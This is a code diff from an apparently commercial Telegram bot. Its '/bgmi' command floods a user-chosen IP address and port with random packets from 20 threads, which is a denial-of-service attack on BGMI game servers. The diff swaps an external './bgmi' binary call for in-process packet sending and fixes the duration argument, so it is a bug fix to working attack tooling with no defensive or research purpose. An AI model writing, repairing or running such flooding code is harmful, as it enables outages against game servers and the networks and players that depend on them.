@@ -225,10 +225,9 @@ Buy From :- @ReporterAlpha'''
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 bot.reply_to(message, f"{message.from_user.username or message.from_user.first_name}, Attack Started.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nGame: BGMI")
-                full_command = f"./bgmi {target} {port} {time} 300"
                 data = os.urandom(600)
                 for _ in range(20):  # 20 threads
-                    threading.Thread(target=send_packets_direct, args=(target, port, data, 0.1, duration)).start()
+                    threading.Thread(target=send_packets_direct, args=(target, port, data, 0.1, time)).start()
                 bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}")
         else:
             bot.reply_to(message, "Usage :- /bgmi <target> <port> <time>")
